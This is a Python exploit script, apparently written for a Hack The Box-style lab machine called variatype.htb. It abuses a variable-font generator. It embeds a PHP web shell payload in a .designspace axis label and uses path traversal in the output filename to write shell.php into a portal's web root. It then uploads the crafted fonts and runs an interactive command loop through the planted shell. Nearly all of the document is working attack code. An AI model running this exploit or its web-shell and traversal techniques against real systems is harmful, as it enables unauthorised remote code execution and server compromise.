import requests
import os
import sys

# Configuration
TARGET_URL = "http://variatype.htb/tools/variable-font-generator/process"
SHELL_URL = "http://portal.variatype.htb/shell.php"
# Path traversal to the portal's web root from the generator's temp workdir (/tmp/variabype_uploads/tmpXXXX/)
TARGET_PATH = "../../../var/www/portal.variatype.htb/public/shell.php"

def create_source_fonts():
    """Generates two dummy master fonts required for variable font building."""
    print("[*] Generating dummy source fonts...")
    try:
        from fontTools.fontBuilder import FontBuilder
        from fontTools.pens.ttGlyphPen import TTGlyphPen

        def build_font(filename, weight):
            fb = FontBuilder(unitsPerEm=1000, isTTF=True)
            fb.setupGlyphOrder([".notdef"])
            fb.setupCharacterMap({})
            
            pen = TTGlyphPen(None)
            pen.moveTo((0, 0))
            pen.lineTo((500, 0))
            pen.lineTo((500, 500))
            pen.lineTo((0, 500))
            pen.closePath()
            
            fb.setupGlyf({".notdef": pen.glyph()})
            fb.setupHorizontalMetrics({".notdef": (500, 0)})
            fb.setupHorizontalHeader(ascent=800, descent=-200)
            fb.setupOS2(usWeightClass=weight)
            fb.setupPost()
            fb.setupNameTable({"familyName": "Source", "styleName": f"Weight{weight}"})
            fb.save(filename)

        build_font("source-light.ttf", 100)
        build_font("source-regular.ttf", 400)
    except ImportError:
        print("[-] Error: fontTools library not found. Please install it with 'pip install fonttools'.")
        sys.exit(1)

def create_exploit_designspace():
    """Creates the malicious .designspace file with PHP payload and path traversal."""
    print("[*] Creating malicious designspace file...")
    payload = "<?php system($_REQUEST['cmd']); ?>"
    designspace = f"""<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[{payload}]]></labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location><dimension name="Weight" xvalue="100"/></location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location><dimension name="Weight" xvalue="400"/></location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="pwn" filename="{TARGET_PATH}">
      <axis-subsets><axis-subset name="Weight"/></axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>"""
    with open("exploit.designspace", "w") as f:
        f.write(designspace)

def upload_exploit():
    """Uploads the files to the target server."""
    print(f"[*] Uploading exploit to {TARGET_URL}...")
    # Note: Using the list of tuples format for multiple files with the same field name 'masters'
    files = [
        ('designspace', ('exploit.designspace', open('exploit.designspace', 'rb'))),
        ('masters', ('source-light.ttf', open('source-light.ttf', 'rb'))),
        ('masters', ('source-regular.ttf', open('source-regular.ttf', 'rb')))
    ]
    try:
        r = requests.post(TARGET_URL, files=files, timeout=30)
        if r.status_code == 200:
            print("[+] Upload successful! Server processed the font.")
        else:
            print(f"[-] Upload status code: {r.status_code}. Checking shell anyway...")
    except Exception as e:
        print(f"[-] Error during upload: {e}")

def interact():
    """Simple loop to execute commands via the dropped shell."""
    print(f"[*] Testing shell at {SHELL_URL}...")
    try:
        r = requests.get(f"{SHELL_URL}?cmd=id", timeout=5)
        if r.status_code == 200:
            print("[+] Shell found! Entering interactive mode (type 'exit' to quit).")
            while True:
                try:
                    cmd = input("www-data@variatype$ ")
                    if cmd.lower() in ("exit", "quit"):
                        break
                    r = requests.get(SHELL_URL, params={'cmd': cmd})
                    # Filter output to show only printable ASCII characters (cleaning up binary font data)
                    output = "".join([c for c in r.text if 31 < ord(c) < 127 or c in ('\n', '\r', '\t')])
                    # Typical font metadata will be mixed in, but the command output should be visible
                    print(output.strip())
                except KeyboardInterrupt:
                    print()
                    break
        else:
            print(f"[-] Shell not found (Status {r.status_code}). Verify the path traversal depth.")
    except Exception as e:
        print(f"[-] Shell check failed: {e}")

if __name__ == "__main__":
    create_source_fonts()
    create_exploit_designspace()
    upload_exploit()
    interact()
